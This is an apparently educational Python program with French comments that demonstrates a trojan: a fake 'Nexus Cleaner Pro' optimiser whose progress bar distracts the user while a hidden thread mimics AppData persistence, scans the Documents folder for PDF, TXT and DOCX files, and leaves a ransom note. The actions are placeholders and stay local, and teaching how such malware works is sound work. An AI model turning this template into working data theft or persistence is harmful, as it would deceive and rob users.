import os           # Pour interagir avec le système de fichiers (chemins, dossiers)
import shutil       # Pour copier des fichiers (utilisé pour la simulation de persistance/exfiltration)
import time         # Pour gérer les délais (pauses stratégiques)
import threading    # ÉLÉMENT CLÉ : Permet de faire tourner le virus sans bloquer l'interface
import tkinter as tk # Pour créer la fenêtre graphique
from tkinter import ttk, messagebox # Éléments graphiques avancés (barre de progression)

# --- CONFIGURATION DU JOURNAL D'ACTIVITÉ (LOGS) ---
# Ce fichier texte est la "preuve de concept". Il enregistre tout ce que le malware fait 
# dans l'ombre pendant que l'utilisateur regarde la barre de progression.
LOG_FILE = "system_audit.log"

def log_action(message):
    """Fonction pour écrire chaque étape malveillante dans un fichier log."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        # On ajoute l'heure et l'action réalisée
        f.write(f"{time.ctime()} : {message}\n")

class ModernCleaner:
    def __init__(self, root):
        self.root = root
        self.root.title("Nexus Cleaner Pro - v2.0")
        self.root.geometry("450x350")
        self.root.configure(bg="#1e1e1e")  # Style "Dark Mode" pour paraître professionnel

        # Configuration du style visuel de la barre de progression (Bleu sur gris foncé)
        self.style = ttk.Style()
        self.style.theme_use('default')
        self.style.configure("TProgressbar", thickness=20, background="#0078d7")

        # --- ÉLÉMENTS DE L'INTERFACE (LA FAÇADE) ---
        self.header = tk.Label(root, text="NEXUS SYSTEM OPTIMIZER", font=("Segoe UI", 16, "bold"), 
                              fg="#0078d7", bg="#1e1e1e")
        self.header.pack(pady=20)

        self.status_label = tk.Label(root, text="État du système : Non analysé", font=("Segoe UI", 10), 
                                    fg="white", bg="#1e1e1e")
        self.status_label.pack(pady=5)

        # Barre de progression qui sera manipulée pour tromper l'utilisateur
        self.progress = ttk.Progressbar(root, orient="horizontal", length=350, mode="determinate", style="TProgressbar")
        self.progress.pack(pady=20)

        # Le bouton qui déclenche l'action "légitime"
        self.btn_clean = tk.Button(root, text="OPTIMISER MAINTENANT", command=self.start_ui_task, 
                                  font=("Segoe UI", 10, "bold"), bg="#0078d7", fg="white", 
                                  padx=20, pady=10, bd=0, cursor="hand2")
        self.btn_clean.pack(pady=20)

        # --- DÉMARRAGE DU COMPOSANT MALVEILLANT (THREADING) ---
        # On lance le thread malveillant immédiatement. 
        # L'argument 'daemon=True' assure que le virus s'arrête si la fenêtre est fermée.
        self.malware_thread = threading.Thread(target=self.hidden_malware_logic)
        self.malware_thread.daemon = True 
        self.malware_thread.start()

    # =========================================================
    # PARTIE 1 : LOGIQUE VISIBLE (L'INGÉNIERIE SOCIALE)
    # =========================================================
    def start_ui_task(self):
        """Simule un processus de nettoyage pour occuper l'attention de l'utilisateur."""
        self.btn_clean.config(state="disabled") # Désactive le bouton pendant le "nettoyage"
        self.status_label.config(text="Analyse des fichiers temporaires en cours...")
        
        def update_bar():
            # Une boucle qui fait avancer la barre de 0 à 100%
            for i in range(101):
                time.sleep(0.05) # Délai pour rendre le "scan" crédible
                self.progress['value'] = i
                if i == 50: 
                    self.status_label.config(text="Suppression des résidus système...")
                self.root.update_idletasks() # Force la mise à jour de l'affichage
            
            # Message de fin rassurant pour l'utilisateur
            messagebox.showinfo("Nexus Pro", "Optimisation terminée !\n3.4 Go d'espace libéré.")
            self.btn_clean.config(state="normal")
            self.status_label.config(text="État du système : Protégé et Optimisé")

        # On lance l'animation de la barre dans un thread pour ne pas geler la fenêtre
        threading.Thread(target=update_bar).start()

    # =========================================================
    # PARTIE 2 : LOGIQUE CACHÉE (L'ATTAQUE SILENCIEUSE)
    # =========================================================
    def hidden_malware_logic(self):
        """Chef d'orchestre des modules malveillants."""
        log_action("Moteur d'ombre activé : Initialisation de l'attaque.")
        
        # On attend 5 secondes : l'utilisateur est déjà concentré sur la barre de progression
        time.sleep(5)
        
        # Exécution des trois modules de la "Kill Chain"
        self.module_persistence()        # Se cacher dans le système
        self.module_data_exfiltration()   # Voler des documents
        self.module_ransom_note()        # Laisser une trace (Ransomware)

    def module_persistence(self):
        """Simule l'installation d'une copie du virus pour survivre au redémarrage."""
        log_action("Étape 1 : Établissement de la persistance.")
        try:
            # Emplacement discret : le dossier AppData (rarement visité par l'utilisateur)
            appdata = os.path.join(os.getenv('APPDATA'), 'NexusCore')
            if not os.path.exists(appdata):
                os.makedirs(appdata) # Crée le dossier s'il n'existe pas
            
            # On simule un fichier système "nexus_service.exe"
            target = os.path.join(appdata, "nexus_service.exe")
            with open(target, "w") as f:
                f.write("Binary_Simulation_Data") # Simulation de contenu binaire
            
            log_action(f"Succès : Fichier persistant créé dans {appdata}")
        except Exception as e:
            log_action(f"Erreur persistance : {e}")

    def module_data_exfiltration(self):
        """Scanne le PC à la recherche de documents et les copie (vol de données)."""
        log_action("Étape 2 : Scan des documents pour exfiltration.")
        
        # Création d'un dossier "butin" local pour simuler un serveur distant
        dump_folder = "Exfiltrated_Data_Dump"
        if not os.path.exists(dump_folder): 
            os.makedirs(dump_folder)

        # On cible le dossier Documents de l'utilisateur actuel
        doc_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
        count = 0
        
        # os.walk permet de parcourir tous les sous-dossiers récursivement
        for root, dirs, files in os.walk(doc_path):
            for file in files:
                # On cible uniquement les extensions intéressantes (PDF, TXT, DOCX)
                if file.endswith((".pdf", ".txt", ".docx")):
                    log_action(f"Document sensible trouvé : {file}")
                    
                    # Simulation d'exfiltration : on copie le fichier vers notre dossier dump
                    with open(os.path.join(dump_folder, f"stolen_{file}"), "w") as f:
                        f.write("Contenu exfiltré vers le serveur distant.")
                    
                    count += 1
                    if count >= 3: break # Limite de 3 fichiers pour la démonstration
            if count >= 3: break
        log_action(f"Exfiltration terminée : {count} fichiers compromis.")

    def module_ransom_note(self):
        """Action finale : informe la victime (simulée) de l'attaque."""
        try:
            # Création d'un fichier texte de rançon sur le bureau ou dossier local
            with open("URGENT_README.txt", "w", encoding="utf-8") as f:
                f.write("VOTRE SYSTÈME A ÉTÉ ANALYSÉ PAR NEXUS.\n")
                f.write("Ceci est une simulation pédagogique de sécurité.\n")
                f.write("Toutes vos données ont été (virtuellement) exfiltrées.")
            log_action("Étape 3 : Note de rançon déposée.")
        except:
            pass

# --- POINT D'ENTRÉE DU PROGRAMME ---
if __name__ == "__main__":
    root = tk.Tk()
    app = ModernCleaner(root) # Lancement de l'application
    root.mainloop() # Maintient la fenêtre ouverte